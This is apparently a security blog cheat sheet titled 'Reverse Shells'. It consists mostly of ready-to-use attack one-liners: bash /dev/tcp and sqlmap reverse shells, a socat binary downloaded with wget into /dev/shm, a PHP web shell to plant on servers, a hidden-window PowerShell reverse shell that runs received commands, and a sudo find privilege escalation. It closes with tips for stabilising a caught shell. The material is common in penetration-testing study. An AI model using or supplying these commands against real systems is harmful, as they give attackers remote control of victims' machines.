---
title: "Reverse Shells"
date: 2025-04-10 +0530
categories: [Cyber-Security]
tags: [bash, socat, shell, reverse, tcp, find, sqlmap, linux, shells, one-liners]
order: 6
image: /assets/images/Cyber-Security/Reverse-Shells.png
---

A reverse shell is a technique where the target machine initiates a connection back to the attacker, allowing remote access even through firewalls. Below are examples, including stabilization tips.

## 🎧 On the Attacker Machine (Listener)

```bash
nc -lvnp <Port>
```

Start a listener to catch the reverse shell connection.

## 🐚 Bash Reverse Shell

```bash
/bin/sh -i >& /dev/tcp/<Your-IP>/<Port> 0>&1
```

Simple, reliable one-liner using bash networking capabilities.

## 📼 Linux Script Shell

```bash
script -qc /bin/bash /dev/null
```

Used to stabilize a limited shell via `script`.

## 🔀 Socat Reverse Shell (Static Binary)

```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat
chmod +x /dev/shm/socat
/dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<Your-IP>:<Port>
```

Full-featured shell with proper TTY, even when `socat` isn’t installed.

## 🔎 Find Command Reverse Shell

```bash
sudo find . -exec /bin/sh \; -quit
```

Useful when `sudo` permissions include `find`. Pops a shell.

## 🧪 SQLMap Reverse Shell

```bash
sqlmap --os-shell --hostname target --os-cmd "bash -i >& /dev/tcp/<Your-IP>/443 0>&1"
```

Trigger a shell via SQLMap after gaining command execution access.

## 🐘 PHP Reverse Shell

```php
<?php system("bash -c 'bash -i >& /dev/tcp/<Your-IP>/4444 0>&1'"); ?>
```

Drop this on a server to trigger a reverse shell if there's file inclusion or RCE.

## 🪟 PowerShell Reverse Shell (Windows)

```powershell
powershell -nop -w hidden -c "$client = New-Object System.Net.Sockets.TCPClient('<Your-IP>',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"
```

Reverse shell for Windows systems with PowerShell access.

# 🧩 Stabilizing a Reverse Shell

When you catch a shell, it’s often unstable or limited. Here’s how to fix it.

## 🐍 Upgrade to PTY Shell

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Provides a pseudo-terminal (more interactive, handles input better).

## 💤 Suspend the Shell

Press `Ctrl+Z`

Sends the shell to background so you can configure your terminal.

## 🛠️ Raw Mode + Foreground

```bash
stty raw -echo
fg
```

Switches terminal mode and brings shell back to foreground.

## 📐 Fix Size + Colors

```bash
export SHELL=bash
stty rows 30 columns 120
export TERM=xterm-256color
```

Helps with arrow keys, colors, resizing issues.